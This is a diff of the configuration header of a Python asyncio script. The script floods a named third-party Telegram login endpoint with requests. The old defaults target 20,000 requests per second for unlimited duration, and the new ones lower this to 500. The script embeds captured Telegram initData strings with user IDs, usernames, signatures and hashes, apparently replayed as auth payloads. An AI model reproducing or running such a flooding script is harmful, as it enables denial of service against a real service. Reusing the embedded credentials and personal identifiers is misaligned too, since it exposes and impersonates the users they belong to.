@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import asyncio
 import aiohttp
-import json
 import os
 import time
 import signal
@@ -9,14 +8,14 @@ from datetime import datetime
 from collections import defaultdict
 
 URL = "https://api.subo-kick.com/auth/telegram"
-RPS_TARGET = int(os.getenv("RPS_TARGET", "20000"))       # запросов в секунду
-DURATION = int(os.getenv("DURATION_SECONDS", "0"))     # 0 = бесконечно
-MAX_WORKERS = int(os.getenv("MAX_WORKERS", "500"))     # параллельных задач
-TIMEOUT = int(os.getenv("TIMEOUT", "3"))               # таймаут запроса (сек)
+RPS_TARGET = int(os.getenv("RPS_TARGET", "500"))
+DURATION = int(os.getenv("DURATION_SECONDS", "0"))
+MAX_WORKERS = int(os.getenv("MAX_WORKERS", "100"))
+TIMEOUT = int(os.getenv("TIMEOUT", "5"))
 
-# Данные из примера (можно поменять)
+# НОВЫЕ ДАННЫЕ (initData без query_id)
 FINGERPRINT = "ab91564731da6d678942178a4d31f4ba"
-INIT_DATA = "query_id=AAGLTv4FBAAAAItO_gXLRsg2&user=%7B%22id%22%3A8690486923%2C%22first_name%22%3A%22Clarence%22%2C%22last_name%22%3A%22Reilly%22%2C%22username%22%3A%22financeboq%22%2C%22language_code%22%3A%22ru%22%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2FQ-eTjTU3Fe8OvA9TZRtCnHdyxX2qI1mjMx9xMUrLksbnVZZ8NnR2JnppNA8X_0AG.svg%22%7D&auth_date=1777329444&signature=RGYk54CmTk0vlqOh_C98YKFA0AViAY9H54LrmKrSfkQ_LSLJuq8-gV6TyKGF3_9H2M3Klr8RiiMY4MoH3C-9Dw&hash=8db153c9cab4e8e3cec0ec0aaedfa8ee6d7ce9e4bf84d8f9091adba9a9c1cb7a"
+INIT_DATA = "user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%40rekrut%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&chat_instance=-1500624000961944755&chat_type=sender&auth_date=1777329916&signature=z29Zfu7xR5E0adU7_momtLqkeER8Gw8I8nPXi-H-FoJYJ7fOHC4_1VnEVAwJvCoo8IJT7M5KbENe1TU92RnYBQ&hash=d09e3f415fe69d50b88a3201e970bd5db05815d4087bc69f6281cb2c97b8613a"
 
 PAYLOAD = {
     "fingerprint": FINGERPRINT,
